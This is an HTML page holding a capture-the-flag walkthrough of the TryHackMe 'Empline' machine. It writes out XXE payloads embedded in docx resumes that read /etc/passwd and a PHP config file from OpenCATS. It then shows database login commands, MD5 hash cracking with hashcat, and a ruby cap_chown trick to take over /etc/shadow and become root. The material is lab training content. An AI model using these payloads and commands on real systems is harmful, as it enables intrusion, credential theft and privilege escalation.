<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>empline</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>empline</h1><br/><p><strong><h1>THM: Empline</h1></strong></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong><h3>Network Enumeration</h3></strong></p><p><strong><h4>1. Nmap</h4></strong></p><p><img src="images/68-1.png" alt="images/68-1.png" /></p><p></p><p></p><p><strong><h3>Website Enumeration</h3></strong></p><p><strong><h4>1. Browser</h4></strong></p><p>We see a employment portal website.</p><p><img src="images/68-2.png" alt="images/68-2.png" /></p><p></p><p>By clicking on the <strong>“EMPLOYMENT” </strong>header nothing happens. However, we can see on the bottom left of the browser that it is trying to connect to <strong>http://jobs.empline.com</strong></p><p></p><p><img src="images/68-3.png" alt="images/68-3.png" /></p><p></p><p>Thus, we add <strong>job.empline.thm</strong> &amp; <strong>empline.thm</strong> to our kali machine&#39;s hosts file. (Add the following line)</p><p></p><p>10.10.164.113 	job.empline.thm  empline.thm</p><p></p><p>Next, we go the url pointed by the “EMPLOYMENT” tab. We can see its a job portal where there are openings &amp; we can apply for a job. We have to upload a resume. </p><p></p><p><img src="images/68-4.png" alt="images/68-4.png" /></p><p></p><p></p><p><img src="images/68-5.png" alt="images/68-5.png" /></p><p></p><p><img src="images/68-6.png" alt="images/68-6.png" /></p><p></p><p></p><p><img src="images/68-7.png" alt="images/68-7.png" /></p><p></p><p>Now, also if we remove the /careers from the url &amp; try to access <strong>http://job.empline.com</strong> we get the following login page.</p><p><img src="images/68-8.png" alt="images/68-8.png" /></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p><strong>Note:</strong> There is a very easy way to foothold this machine. The <strong>opencats</strong> login page is version <strong>0.9.4</strong> which has RCE vulnerability &amp; can be easily found using searchsploit.</p><p></p><p><img src="images/68-9.png" alt="images/68-9.png" /></p><p></p><p>However, we will try to do it the manual way.</p><p></p><p><strong>Reference: https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/</strong></p><p></p><p>The vulnerability that Opencats has is XXE in the uploaded docx files.</p><p></p><p>Lets create a docx file using python.</p><p></p><p><em>from docx import Document</em></p><p><em>document = Document()</em></p><p><em>paragraph = document.add_paragraph(&#39;Ansuman Ray&#39;)</em></p><p><em>document.save(&#39;resume.docx&#39;)</em></p><p></p><p><img src="images/68-10.png" alt="images/68-10.png" /></p><p></p><p><strong>Note:</strong> We can also create a file using any GUI office software. Just create docx file &amp; put a name to regonize it later.</p><p>Next, we <strong>upload</strong> the document in the portal by clicking on upload. It will show our <strong>name</strong>.</p><p>In my case it will show ‘<strong>Ansuman Ray</strong>’</p><p></p><p></p><p><img src="images/68-11.png" alt="images/68-11.png" /></p><p></p><p>Next, as per the reference, we try to create a <strong>XXE payload</strong>. For that we need to <strong>unzip</strong> the <strong>docx</strong> file &amp; edit one of its <strong>XML</strong> file.</p><p></p><p><img src="images/68-12.png" alt="images/68-12.png" /></p><p></p><p>we will edit the <strong>word/document.xml</strong> to include our XXE payload.</p><p></p><p><img src="images/68-13.png" alt="images/68-13.png" /></p><p></p><p>we add DOCTYPE comment &amp; include a payload name. (<strong>payload</strong>) in my case.</p><p>Then call that same payload from the document where we replaced “<strong>Ansuman Ray</strong>” with “<strong>&amp;payload;</strong>”</p><p>we save the document &amp; zip it back.</p><p></p><p><em>&lt;!DOCTYPE test [&lt;!ENTITY payload SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;</em></p><p><em>&amp;payload;</em></p><p></p><p><em>zip resume.docx word/document.xml</em></p><p></p><p>We upload it again to test the payload.</p><p></p><p><img src="images/68-14.png" alt="images/68-14.png" /></p><p></p><p>As we can see, we have successfully exploited the vulnerability. Now to get foothold into the system we need to look for some files that would have sensitive information.</p><p>We know that EMPLINE website is running on a php server so lets try to read the config file. Using our earliear reference. Following is the payload.</p><p></p><p><em>&lt;!DOCTYPE test [&lt;!ENTITY payload SYSTEM &#39;php://filter/convert.base64-encode/resource=config.php&#39;&gt;]&gt;</em></p><p></p><p>we change the word/document.yml file again &amp; zip it back to create our new resume.docx. Next, we upload it.</p><p><img src="images/68-15.png" alt="images/68-15.png" /></p><p></p><p>we got a base64 encodedoutput of <strong>config,php</strong> file. Lets, decode this.</p><p>copy it to a file in our local system &amp; then run the following command.</p><p></p><p><em>cat config_raw | base64 -d &gt; config.php</em></p><p></p><p><img src="images/68-16.png" alt="images/68-16.png" /></p><p></p><p>We got a DB credential in the file.</p><p></p><p><img src="images/68-17.png" alt="images/68-17.png" /></p><p></p><p>Lets, login to the database from our machine. Since we know that port 3306 was open during nmap scan.</p><p></p><p><em>mysql -h 10.10.164.113 -u james -p</em></p><p><em></em></p><p><em>show databases;</em></p><p><em>use opencats;</em></p><p><em>show tables;</em></p><p><em>select * from user;</em></p><p><em></em></p><p><img src="images/68-18.png" alt="images/68-18.png" /></p><p></p><p>we see a table named user. We open it to see the username &amp; passwords. </p><p>The user we are interested in is <strong>george</strong> as during our <strong>intial XXE testing </strong>we saw the <strong>/etc/passwd</strong> file &amp; we know that <strong>george</strong> is a server user.</p><p></p><p><img src="images/68-19.png" alt="images/68-19.png" /></p><p></p><p><img src="images/68-20.png" alt="images/68-20.png" /></p><p></p><p>we get a hashed password of george. We will check it in <strong>hashid</strong> to find its type &amp; then try to crack it using <strong>hashcat</strong>.</p><p></p><p><img src="images/68-21.png" alt="images/68-21.png" /></p><p></p><p>hashid suggests MD2 &amp; MD5. We will try will MD5 using hashcat.</p><p></p><p><em>hashid 86d0dfda99dbebc424eb4407947356ac</em></p><p><em>hashcat -m 0 86d0dfda99dbebc424eb4407947356ac /usr/share/wordlists/rockyou.txt</em></p><p></p><p><img src="images/68-22.png" alt="images/68-22.png" /></p><p></p><p>we got the password for the user george. We SSH to the machine using the above credentials &amp; get the user flag from george&#39;s home.</p><p><img src="images/68-23.png" alt="images/68-23.png" /></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>For privilege escalation on this system we will use <strong>capablities</strong>. We list the allowed capabliities using the following.</p><p></p><p><em>getcap -r / 2&gt;/dev/null</em></p><p></p><p><img src="images/68-24.png" alt="images/68-24.png" /></p><p></p><p>we can see that <strong>ruby</strong> binary has <strong>cap_chown+ep </strong>capability set. This can be used to changed the ownership of any file in the system.</p><p></p><p><em>/usr/local/bin/ruby -e &quot;File.chown(1002, 1002, &#39;/etc/shadow&#39;)&quot;</em></p><p></p><p><img src="images/68-25.png" alt="images/68-25.png" /></p><p></p><p>we will create a openssl password (12345) &amp; replace it in place of root.</p><p></p><p><em>openssl passwd -6 -salt cybex 12345</em></p><p></p><p><img src="images/68-26.png" alt="images/68-26.png" /></p><p></p><p>we add the encrypted password into the /etc/shadow file &amp; switch to root user.</p><p></p><p><img src="images/68-27.png" alt="images/68-27.png" /></p><p></p><p>Thanks !!</p></div>
</body>
</html>
